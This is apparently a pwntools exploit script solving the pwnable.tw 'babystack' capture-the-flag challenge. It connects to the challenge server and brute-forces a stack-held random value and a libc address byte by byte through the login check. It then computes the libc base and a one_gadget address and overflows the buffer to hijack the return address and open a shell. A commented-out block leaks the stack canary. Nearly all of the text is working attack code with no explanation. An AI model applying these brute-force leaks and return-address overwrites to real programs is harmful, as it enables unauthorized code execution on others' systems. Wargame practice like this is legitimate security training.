
from pwn import *

r = remote("chall.pwnable.tw", 10205)
#r = process("./babystack")
#r = process('./babystack', env={"LD_PRELOAD":"./libc_64.so.6"})

def transIntToBytes(int_):
    return hex(int.from_bytes(int_, byteorder="little"))

### leak rand_num

stack_element = b''
rand_num = b''
for t in range(16):
    payload = b''
    for i in range(1, 256):
        #print(i)
        r.recvuntil(">> ")
        r.send("1"+"a"*15)
        r.recvuntil(":")
        payload = bytes([i])
        r.sendline(stack_element + payload)
        msg = r.recvline().strip()
        if msg[:5] == b'Login':
            r.recvuntil(">> ") ## logout
            r.send("1"+"a"*15)
            print(msg)
            break
        if i == 255:
            payload = b'\x00'
    stack_element += payload
    rand_num += payload
print(f'rand_num1: {transIntToBytes(rand_num[0:8])}')
print(f'rand_num2: {transIntToBytes(rand_num[8:16])}')


######################## 
r.recvuntil(">> ")
#input("@")
r.send("1")
r.recvuntil(":")
r.send(b'\x00' + b'b'*0x47) # 0x3f

r.recvuntil(">> ")
r.send("3")
r.recvuntil(":")
r.send("c"*0x28)




## logout
r.recvuntil(">> ")
r.send("1")




#stack_element = b'b'*16 + b'1' + b'a'*15
stack_element = b'b'*8
leak = b''
for t in range(6):
    payload = b''
    for i in range(1, 256):
        #print(i)
        r.recvuntil(">> ")
        r.send("1"+"a"*15)
        r.recvuntil(":")
        payload = bytes([i])
        r.sendline(stack_element + payload)
        msg = r.recvline().strip()
        if msg[:5] == b'Login':
            r.recvuntil(">> ") ## logout
            r.send("1"+"a"*15)
            print(msg)
            break
        if i == 255:
            payload = b'\x00'
    stack_element += payload
    leak += payload
print(f'leak: {transIntToBytes(leak)}')

libc_base = int.from_bytes(leak, byteorder="little") - 0x78439 # 0x3ec760
print(f'libc_base: {hex(libc_base)}')
one_gadget = libc_base + 0xf0567 # 0xef6c4


'''
### leak canary

r.recvuntil(">> ")
r.send("1")
r.recvuntil(":")
r.send(b'\x00' + b'b'*0x48)


r.recvuntil(">> ")
r.send("3")
r.recvuntil(":")
r.send("c"*0x28)


## logout
r.recvuntil(">> ")
r.send("1")


stack_element = b'b'*9
canary = b'\x00'
for t in range(7):
    payload = b''
    for i in range(1, 256):
        #print(i)
        r.recvuntil(">> ")
        r.send("1"+"a"*15)
        r.recvuntil(":")
        payload = bytes([i])
        r.sendline(stack_element + payload)
        msg = r.recvline().strip()
        if msg[:5] == b'Login':
            r.recvuntil(">> ") ## logout
            r.send("1"+"a"*15)
            print(msg)
            break
        if i == 255:
            payload = b'\x00'
    stack_element += payload
    canary += payload

print(f'canary: {transIntToBytes(canary)}')
'''




## get shell by one gadget

print(f'one_gadget: {hex(one_gadget)}')
r.recvuntil(">> ")
r.send("1")
r.recvuntil(":")
r.send(b'\x00' + b'x'*0x3f + rand_num[0:8] + rand_num[8:16] + b'i'*8 + b'j'*8 + b'k'*8 + p64(one_gadget))


r.recvuntil(">> ")
r.send("3")
r.recvuntil(":")
r.send("c"*0x28)


r.recvuntil(">> ")
input("@")
r.send("2")
r.interactive()




